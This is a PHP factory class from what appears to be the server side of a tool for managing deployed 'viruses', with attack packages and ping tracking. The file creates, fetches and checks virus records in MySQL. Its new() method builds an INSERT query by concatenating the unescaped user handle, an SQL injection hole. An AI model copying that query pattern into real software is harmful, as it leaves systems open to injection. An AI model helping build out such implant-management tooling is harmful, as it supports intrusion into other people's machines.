<?php

namespace Kelvinho\Virus\Virus;

use Kelvinho\Virus\Attack\AttackFactory;
use Kelvinho\Virus\Attack\PackageRegistrar;
use Kelvinho\Virus\Id\IdGenerator;
use Kelvinho\Virus\Network\Session;
use Kelvinho\Virus\Singleton\Logs;
use Kelvinho\Virus\Usage\UsageFactory;
use Kelvinho\Virus\User\UserFactory;
use mysqli;

/**
 * Class VirusFactoryImp
 *
 * @package Kelvinho\Virus\Virus
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class VirusFactoryImp implements VirusFactory {
    private Session $session;
    private UserFactory $userFactory;
    private AttackFactory $attackFactory;
    private IdGenerator $idGenerator;
    private mysqli $mysqli;
    private PackageRegistrar $packageRegistrar;
    private UsageFactory $usageFactory;

    public function __construct(Session $session, UserFactory $userFactory, AttackFactory $attackFactory, IdGenerator $idGenerator, mysqli $mysqli, PackageRegistrar $packageRegistrar, UsageFactory $usageFactory) {
        $this->session = $session;
        $this->userFactory = $userFactory;
        $this->attackFactory = $attackFactory;
        $this->idGenerator = $idGenerator;
        $this->mysqli = $mysqli;
        $this->packageRegistrar = $packageRegistrar;
        $this->usageFactory = $usageFactory;
    }

    public function new(string $user_handle = null, bool $standalone = true, string $virus_id = null): Virus {
        $virus_id = $virus_id ?? $this->idGenerator->newVirusId();
        $usage = $this->usageFactory->new();
        $user_handle = $user_handle ?? $this->session->get("user_handle");
        if (!$this->mysqli->query("insert into viruses (virus_id, user_handle, last_ping, name, active, type, resource_usage_id) values ('$virus_id', '" . $user_handle . "', 0, '(not set)', b'0', b'" . ($standalone ? "0" : "1") . "', " . $usage->getId() . ")")) Logs::mysql($this->mysqli);
        mkdir(DATA_FILE . "/viruses/$virus_id");
        touch(DATA_FILE . "/viruses/$virus_id/profile.txt");

        return $this->get($virus_id);
    }

    public function get(string $virus_id): Virus {
        if (!$this->exists($virus_id)) throw new VirusNotFound();
        return new Virus($virus_id, $this->userFactory, $this->attackFactory, $this->mysqli, $this->packageRegistrar, $this->usageFactory);
    }

    public function exists(string $virus_id): bool {
        if (!$answer = $this->mysqli->query("select virus_id from viruses where virus_id = '" . $this->mysqli->escape_string($virus_id) . "'")) return false;
        if (!$row = $answer->fetch_assoc()) return false;
        return true;
    }
}
